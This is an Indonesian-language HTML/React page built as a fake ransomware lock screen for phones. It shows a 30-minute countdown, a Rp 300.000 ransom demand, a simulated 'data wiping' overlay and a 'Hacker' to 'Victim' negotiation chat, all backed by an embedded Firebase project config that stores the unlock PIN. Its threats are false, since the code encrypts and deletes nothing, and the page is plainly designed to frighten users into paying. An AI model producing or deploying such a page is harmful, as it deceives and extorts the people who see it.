<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Terkunci - Akses Ditolak</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap');
        body { font-family: 'JetBrains Mono', monospace; background-color: #000; color: #00ff00; overflow: hidden; }
        .glow-green { text-shadow: 0 0 10px #00ff00; }
        .glitch { animation: glitch 1.5s linear infinite; }
        @keyframes glitch {
            2%, 64% { transform: translate(2px, 0) skew(0deg); }
            4%, 60% { transform: translate(-2px, 0) skew(0deg); }
            62% { transform: translate(0, 0) skew(5deg); }
        }
        @keyframes progress { from { width: 100%; } to { width: 0%; } }
        .animate-progress { animation: progress 1800s linear forwards; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, onSnapshot, setDoc, updateDoc, arrayUnion, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
            authDomain: "nagalocker.firebaseapp.com",
            projectId: "nagalocker",
            storageBucket: "nagalocker.firebasestorage.app",
            messagingSenderId: "529236383091",
            appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
            measurementId: "G-S98ECJN5LY"
        };

        window.FirebaseLib = {
            app: initializeApp(firebaseConfig),
            getFirestore, doc, onSnapshot, setDoc, updateDoc, arrayUnion, getDoc,
            getAuth, signInAnonymously, onAuthStateChanged
        };
        window.dispatchEvent(new Event('firebase-ready'));
    </script>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function App() {
            const [fbReady, setFbReady] = useState(false);
            const [state, setState] = useState({
                timeLeft: 1800, ransom: '300.000', messages: [],
                isWiping: false, isLocked: true, validPins: ['1234']
            });
            const [input, setInput] = useState('');
            const [pinInput, setPinInput] = useState('');
            const [showModal, setShowModal] = useState(false);
            const [error, setError] = useState('');

            useEffect(() => {
                const handleReady = () => setFbReady(true);
                if (window.FirebaseLib) handleReady();
                else window.addEventListener('firebase-ready', handleReady);
            }, []);

            useEffect(() => {
                if (!fbReady) return;
                const { getAuth, signInAnonymously, getFirestore, doc, onSnapshot, getDoc, setDoc } = window.FirebaseLib;
                const auth = getAuth();
                const db = getFirestore();
                // FIXED PATH: 6 Segments (Collection/Doc/Collection/Doc/Collection/Doc)
                const docRef = doc(db, "artifacts", "nagalocker", "public", "data", "locker_state", "current");

                signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
                
                getDoc(docRef).then(snap => {
                    if (!snap.exists()) {
                        setDoc(docRef, {
                            timeLeft: 1800, ransom: '300.000', isWiping: false, isLocked: true,
                            messages: [{ sender: 'Hacker', text: 'Sistem lu udah gue enkripsi. Jangan coba-coba lari.', time: Date.now() }],
                            validPins: ['1234']
                        });
                    }
                });

                return onSnapshot(docRef, (s) => s.exists() && setState(s.data()));
            }, [fbReady]);

            const sendMsg = async () => {
                if (!input.trim()) return;
                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                const db = getFirestore();
                const docRef = doc(db, "artifacts", "nagalocker", "public", "data", "locker_state", "current");
                await updateDoc(docRef, {
                    messages: arrayUnion({ sender: 'Victim', text: input, time: Date.now() })
                });
                setInput('');
            };

            const checkPin = async () => {
                if (state.validPins && state.validPins.includes(pinInput)) {
                    const { getFirestore, doc, updateDoc } = window.FirebaseLib;
                    const db = getFirestore();
                    const docRef = doc(db, "artifacts", "nagalocker", "public", "data", "locker_state", "current");
                    await updateDoc(docRef, { isLocked: false });
                    setShowModal(false);
                } else {
                    setError("PIN SALAH! DATA AKAN SEGERA DIHAPUS!");
                    setPinInput('');
                    setTimeout(() => setError(''), 3000);
                }
            };

            useEffect(() => { window.lucide && lucide.createIcons(); }, [state, showModal]);

            if (!fbReady) return <div className="h-screen bg-black flex items-center justify-center text-green-500 font-mono">ESTABLISHING CONNECTION...</div>;

            if (!state.isLocked) {
                return (
                    <div className="h-screen bg-black flex flex-col items-center justify-center p-8 text-center animate-in fade-in duration-1000">
                        <i data-lucide="shield-check" className="w-24 h-24 text-green-500 mb-6 animate-bounce"></i>
                        <h1 className="text-3xl font-black text-white glow-green mb-4 italic uppercase">Device Unlocked</h1>
                        <p className="text-gray-400 text-sm">Dekripsi selesai. HP anda telah dikembalikan ke mode normal.</p>
                        <button onClick={() => window.location.reload()} className="mt-10 px-8 py-3 bg-green-600 text-black font-black rounded-xl active:scale-95 transition-all">REBOOT SYSTEM</button>
                    </div>
                );
            }

            return (
                <div className="h-screen flex flex-col p-6 relative bg-black select-none">
                    {state.isWiping && (
                        <div className="absolute inset-0 z-[100] bg-black flex flex-col items-center justify-center text-red-600 animate-pulse text-center p-10 border-4 border-red-600">
                            <i data-lucide="skull" className="w-20 h-20 mb-4"></i>
                            <h1 className="text-3xl font-black italic">MENGHAPUS DATA...</h1>
                            <p className="text-xs mt-4 font-mono">Overwriting sector: 0x88AF...</p>
                        </div>
                    )}

                    <header className="text-center mt-12 mb-8">
                        <h1 className="text-2xl font-black text-green-500 glow-green mb-2 glitch uppercase tracking-tighter">Device Anda Terkunci !!</h1>
                        <div className="text-red-600 text-6xl font-black font-mono tracking-tighter mt-6 mb-4 drop-shadow-[0_0_15px_rgba(220,38,38,0.6)]">
                            {Math.floor(state.timeLeft / 60)}:{(state.timeLeft % 60).toString().padStart(2, '0')}
                        </div>
                        <div className="w-full h-1.5 bg-gray-950 rounded-full overflow-hidden border border-green-950">
                            <div className="h-full bg-green-500 animate-progress" style={{width: '100%'}}></div>
                        </div>
                        <p className="mt-6 text-[10px] text-red-500 font-bold bg-red-950/20 py-2 border-y border-red-900 uppercase">ACCESS DENIED: ENCRYPTED BY ARCHITECT</p>
                    </header>

                    <div className="bg-green-950/5 border border-green-900/20 p-6 rounded-[2.5rem] mb-8 backdrop-blur-md">
                        <div className="flex justify-between items-center mb-6">
                            <span className="text-[10px] text-gray-600 font-black uppercase tracking-widest">Tagihan Tebusan</span>
                            <span className="text-2xl font-black text-white font-mono">Rp {state.ransom}</span>
                        </div>
                        <button onClick={() => setShowModal(true)} className="w-full bg-green-600 text-black py-4 rounded-2xl font-black text-xs shadow-xl active:scale-95 transition-all uppercase">Masukkan PIN Pembuka</button>
                        {error && <p className="text-[10px] text-red-500 font-black mt-4 animate-pulse text-center uppercase tracking-widest">{error}</p>}
                    </div>

                    <div className="flex-1 flex flex-col min-h-0 bg-black/40 border border-green-900/10 rounded-[2.5rem] p-6 overflow-hidden">
                        <div className="flex-1 overflow-y-auto space-y-4 mb-4 scrollbar-hide px-1 text-[11px]">
                            {state.messages && state.messages.map((m, i) => (
                                <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-start' : 'items-end'}`}>
                                    <div className={`max-w-[85%] px-4 py-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-green-600 text-black font-bold' : 'bg-gray-900 text-gray-300 border border-gray-800'}`}>
                                        <span className="text-[8px] block mb-1 opacity-50 uppercase tracking-tighter font-black">{m.sender}</span>
                                        {m.text}
                                    </div>
                                </div>
                            ))}
                        </div>
                        <div className="relative">
                            <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Ketik negosiasi..." className="w-full bg-black border border-green-900/20 p-4 pr-14 text-xs rounded-2xl outline-none focus:border-green-500 transition-all text-white" />
                            <button onClick={sendMsg} className="absolute right-4 top-1/2 -translate-y-1/2 text-green-500"><i data-lucide="send" className="w-5 h-5"></i></button>
                        </div>
                    </div>

                    {showModal && (
                        <div className="fixed inset-0 z-[200] bg-black/95 backdrop-blur-xl flex items-center justify-center p-6 animate-in zoom-in duration-300">
                            <div className="w-full max-w-sm bg-slate-950 border border-green-500/20 p-10 rounded-[3rem] shadow-[0_0_60px_rgba(34,197,94,0.1)]">
                                <h2 className="text-xl font-black text-white text-center italic uppercase mb-8">Verifikasi PIN</h2>
                                <input type="text" maxLength={8} value={pinInput} onChange={(e) => setPinInput(e.target.value)} placeholder="••••••••" className="w-full bg-black border border-green-900/40 p-5 text-center text-3xl text-green-500 font-mono rounded-2xl mb-8 outline-none focus:border-green-500 tracking-[0.2em]" autoFocus />
                                <div className="flex gap-4">
                                    <button onClick={() => setShowModal(false)} className="flex-1 text-[10px] font-black text-gray-700 uppercase">Batal</button>
                                    <button onClick={checkPin} className="flex-[2] bg-green-600 text-black py-4 rounded-2xl font-black text-xs active:scale-95 transition-all shadow-lg uppercase">Verifikasi</button>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            );
        }

        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
        setInterval(() => window.lucide && lucide.createIcons(), 1000);
    </script>
</body>
</html>
